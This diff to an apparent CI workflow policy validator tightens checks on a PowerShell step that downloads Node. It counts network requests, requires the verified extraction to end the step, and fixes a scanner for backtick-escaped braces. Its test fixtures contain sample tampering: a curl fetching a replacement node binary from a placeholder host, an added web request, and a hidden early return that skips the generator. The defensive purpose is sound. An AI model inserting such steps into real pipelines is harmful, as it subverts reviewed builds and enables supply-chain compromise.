@@ -177,6 +177,7 @@ const REVIEWED_VERIFY_STEP_DIGEST = '238b85b3f36cc5bc4a4b8a023342617be23c60cdc36
 const BUILD_ACQUIRE = Object.freeze({
   name: 'Acquire triggering revision without an action',
   classifiedStatuses: 5,
+  networkClients: 0,
   digest: '0eb96c20d7d2adfd724248f504b2fc5eb1b9306b8f51640ed7a0bafacdc5ff8c',
 });
 
@@ -191,15 +192,28 @@ const MARKDOWN_ACQUIRE = Object.freeze({
   name: 'Acquire triggering revision and pinned toolchain without an action',
   classifiedStatuses: 7,
   digest: '8416025cdcf74b9157bff09d4e931710f904c67c1321235a5e3398c18e6270b6',
+  networkClients: 1,
   extraSequences: Object.freeze([
     ['the exact reviewed Node archive',
       "$strNodeUrl = 'https://nodejs.org/dist/v24.18.1/node-v24.18.1-linux-x64.tar.xz'"],
     ['the reviewed Node archive digest',
       `$strReviewedNodeSha256 = '${REVIEWED_NODE_ARCHIVE_SHA256}'`],
-    ['that the downloaded archive matches that digest before it is used',
-      '$strObservedNodeSha256 = (Get-FileHash -LiteralPath $strArchivePath -Algorithm SHA256).Hash\n' +
-      'if ($strObservedNodeSha256 -cne $strReviewedNodeSha256) {'],
+    // One contiguous block rather than three separate presence checks. Naming
+    // the download, the comparison, and the extraction individually says each
+    // is present and says nothing about what sits between them -- and what
+    // sits between them is the whole question, because a statement inserted
+    // after the comparison and before the extraction replaces the archive that
+    // was just verified, and one inserted after the extraction replaces the
+    // binaries that came out of it. Requiring the region to be exactly this
+    // leaves no position for either.
+    ['the download, its verification, and the extraction as one uninterrupted block',
+      '& curl --silent --show-error --fail --location --proto \'=https\' --tlsv1.2 --output $strArchivePath $strNodeUrl\nif ($LASTEXITCODE -ne 0) { throw "acquire: node download exited $LASTEXITCODE" }\n$strObservedNodeSha256 = (Get-FileHash -LiteralPath $strArchivePath -Algorithm SHA256).Hash\nif ($strObservedNodeSha256 -cne $strReviewedNodeSha256) {\n    throw \'acquire: the Node archive does not match the reviewed digest\'\n}\n[void][System.IO.Directory]::CreateDirectory($strNodeRoot)\n& tar -xJf $strArchivePath -C $strNodeRoot --strip-components=1\nif ($LASTEXITCODE -ne 0) { throw "acquire: node extraction exited $LASTEXITCODE" }\nWrite-Host "acquire: revision $strSha and the reviewed Node distribution"'],
   ]),
+  // And the block is the end of the step, so nothing follows the extraction
+  // at all. Without this the region above could sit anywhere and a later
+  // statement could still overwrite the extracted tree from the checkout,
+  // which needs no network and so is not caught by the count below.
+  tail: '& curl --silent --show-error --fail --location --proto \'=https\' --tlsv1.2 --output $strArchivePath $strNodeUrl\nif ($LASTEXITCODE -ne 0) { throw "acquire: node download exited $LASTEXITCODE" }\n$strObservedNodeSha256 = (Get-FileHash -LiteralPath $strArchivePath -Algorithm SHA256).Hash\nif ($strObservedNodeSha256 -cne $strReviewedNodeSha256) {\n    throw \'acquire: the Node archive does not match the reviewed digest\'\n}\n[void][System.IO.Directory]::CreateDirectory($strNodeRoot)\n& tar -xJf $strArchivePath -C $strNodeRoot --strip-components=1\nif ($LASTEXITCODE -ne 0) { throw "acquire: node extraction exited $LASTEXITCODE" }\nWrite-Host "acquire: revision $strSha and the reviewed Node distribution"',
 });
 
 // The generator is repository-controlled code that the verify job executes. Its
@@ -409,6 +423,28 @@ function powerShellBraceDepthAt(text, offset) {
   while (index < text.length) {
     if (index === offset) return depth;
     const character = text[index];
+    // Outside a quoted span the backtick is PowerShell's escape character, so
+    // the character after it is a literal rather than syntax. This is checked
+    // before the comment and quote branches because a backtick escapes those
+    // introducers too.
+    //
+    // Reproduced before fixing, because the obvious spelling does not work: a
+    // bare "`{" in statement position is parsed as a command named { and fails.
+    // In argument position it does work --
+    //
+    //   Write-Host `{
+    //   return
+    //   Write-Host `}
+    //
+    // -- prints a literal brace and then returns from the script. A scanner
+    // that counted those two braces placed that return at depth one and let it
+    // through, and the balanced pair left the generator assertion at depth zero
+    // so nothing else objected either.
+    //
+    // Inside a single-quoted string the backtick is not an escape, which is why
+    // this sits outside the quote handling rather than inside it: the quote
+    // branch consumes those spans whole before this can see them.
+    if (character === '`') { index += 2; continue; }
     if (character === '#') {
       const start = index;
       while (index < text.length && text[index] !== '\n') index += 1;
@@ -857,6 +893,16 @@ function validateAcquireStep(step, label, expected) {
   }
   if (/\b(?:exit|break|continue|trap)\b/iu.test(step.run)) {
     reject('acquire-policy', `${label} adds control flow that can bypass a required assertion`);
+  }
+  // Counted, not merely permitted. The Markdown acquire step is allowed one
+  // download and the build one is allowed none, and a second request is how a
+  // re-baselined step would fetch something the reviewed digest never covered.
+  const networkClients = step.run.match(new RegExp(NETWORK_CLIENT.source, 'giu'))?.length ?? 0;
+  if (networkClients !== expected.networkClients) {
+    reject('acquire-policy', `${label} network request count changed`);
+  }
+  if (expected.tail !== undefined && !step.run.trimEnd().endsWith(expected.tail)) {
+    reject('acquire-policy', `${label} does not end at the verified extraction`);
   }
   if (createHash('sha256').update(step.run, 'utf8').digest('hex') !== expected.digest) {
     reject('acquire-policy', `${label} script does not match its reviewed digest`);
@@ -1335,6 +1381,11 @@ const FIXTURE_INVENTORY = Object.freeze([
   // at all, so nothing is generated, nothing is compared, and the step still
   // exits zero.
   ['T1-BUILD-122', 'top-level return inserted before the generator', 'build', (source) => replaceOnce(source, '          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n', '          return\n          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n')],
+  // Escaped braces are literals, not block delimiters. Confirmed against
+  // PowerShell: this form prints a brace and then returns from the script,
+  // while a scanner that counted the escaped braces read the return as
+  // depth one and let it through.
+  ['T1-BUILD-123', 'top-level return hidden behind escaped braces', 'build', (source) => replaceOnce(source, '          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n', '          Write-Host `{\n          return\n          Write-Host `}\n          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n')],
   // Inert text satisfies a substring match. This wraps the approved invocation
   // in a single-quoted here-string, so the command appears verbatim in the
   // script and never executes.
@@ -1415,7 +1466,14 @@ const FIXTURE_INVENTORY = Object.freeze([
   ['T1-MARKDOWN-029', 'downloaded Node archive no longer verified before use', 'markdown', (source) => replaceOnce(source, '          $strObservedNodeSha256 = (Get-FileHash -LiteralPath $strArchivePath -Algorithm SHA256).Hash\n          if ($strObservedNodeSha256 -cne $strReviewedNodeSha256) {\n              throw \'acquire: the Node archive does not match the reviewed digest\'\n          }\n', '')],
   // The network ban moved from the file to the step that runs repository code.
   ['T1-MARKDOWN-030', 'network client added to the lint step', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          $objExtra = Invoke-WebRequest -Uri https://example.invalid/rules\n          & $strNpmPath run lint:md\n')],
-  ['T1-MARKDOWN-031', 'acquire step edited without re-review', 'markdown', (source) => replaceOnce(source, '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n', '          Write-Host "acquire: revision $strSha"\n')],
+  // Mutates a line no named assertion covers, so it reaches the backstop
+  // rather than being answered by one of the assertions in front of it.
+  ['T1-MARKDOWN-031', 'acquire step edited without re-review', 'markdown', (source) => replaceOnce(source, '          & git init --quiet .\n', '          & git init .\n')],
+  // A second request fetches bytes the reviewed archive digest never covered.
+  ['T1-MARKDOWN-032', 'second download appended to the acquire step', 'markdown', (source) => replaceOnce(source, '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n', '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n          & curl --silent --output $strNodeRoot/bin/node https://example.invalid/node\n')],
+  // And one that needs no network at all, because the checkout is already on
+  // disk by the time the extraction finishes.
+  ['T1-MARKDOWN-033', 'extracted toolchain overwritten from the checkout', 'markdown', (source) => replaceOnce(source, '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n', '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n          Copy-Item -LiteralPath ./tools/node -Destination $strNodeRoot/bin/node -Force\n')],
   ['T1-MARKDOWN-022', 'lint job regains a token scope', 'markdown', (source) => replaceOnce(source, '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions: {}\n', '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n')],
   ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
     '.markdownlint.jsonc': '{ "default": false }\n',
@@ -1559,6 +1617,7 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-BUILD-100": "credential-policy: verify.generate-and-verify contains a workflow expression",
   "T1-BUILD-101": "side-effect-policy: build.verify returns from the script at top level",
   "T1-BUILD-122": "side-effect-policy: build.verify returns from the script at top level",
+  "T1-BUILD-123": "side-effect-policy: build.verify returns from the script at top level",
   "T1-BUILD-104": "side-effect-policy: the generator is not invoked exactly once as a statement",
   "T1-BUILD-106": "side-effect-policy: verify.generate-and-verify uses a here-string or block comment",
   "T1-BUILD-105": "side-effect-policy: build.verify can suppress a probe failure after the generator runs",
@@ -1627,9 +1686,11 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-MARKDOWN-026": "isolation-policy: markdown.setup-node uses an action",
   "T1-MARKDOWN-027": "acquire-policy: markdown.acquire no longer asserts the exact reviewed Node archive",
   "T1-MARKDOWN-028": "acquire-policy: markdown.acquire no longer asserts the reviewed Node archive digest",
-  "T1-MARKDOWN-029": "acquire-policy: markdown.acquire no longer asserts that the downloaded archive matches that digest before it is used",
+  "T1-MARKDOWN-029": "acquire-policy: markdown.acquire no longer asserts the download, its verification, and the extraction as one uninterrupted block",
   "T1-MARKDOWN-030": "markdown-policy: markdown.validate-and-lint adds a network client",
   "T1-MARKDOWN-031": "acquire-policy: markdown.acquire script does not match its reviewed digest",
+  "T1-MARKDOWN-032": "acquire-policy: markdown.acquire network request count changed",
+  "T1-MARKDOWN-033": "acquire-policy: markdown.acquire does not end at the verified extraction",
   "T1-PACKAGE-005": "supply-policy: resolved yaml parser integrity is not the reviewed value",
   "T1-PACKAGE-006": "policy: lockfile root devDependencies differs from the locked policy",
 });
